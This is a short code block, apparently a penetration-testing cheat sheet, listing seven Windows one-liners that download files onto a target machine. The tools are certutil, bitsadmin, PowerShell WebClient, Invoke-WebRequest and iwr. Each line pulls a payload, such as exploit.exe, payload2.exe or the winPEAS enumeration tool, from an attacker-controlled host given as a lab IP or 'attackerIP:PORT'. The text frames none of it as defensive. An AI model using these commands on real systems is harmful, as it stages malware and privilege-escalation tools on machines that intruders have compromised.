```sh
certutil -urlcache -split -f http://10.10.14.2/payload2.exe payload2.exe

bitsadmin /transfer transfName /priority high http://10.10.14.26/exploit.exe exploit.exe

powershell "(new-object system.net.webclient).downloadfile('http://attackerIP:PORT/exploit.exe','exploit.exe')"

(New-Object Net.WebClient).DownloadFile("http://10.10.14.26/exploit.exe","exploit.exe")

wget "http://10.10.14.26/exploit.exe" -OutFile "exploit.exe"

Invoke-WebRequest "http://10.10.14.26/exploit.exe" -OutFile "exploit.exe"

iwr -uri http://192.168.10.10/winPEAS64.exe -Outfile winPEAS.exe
```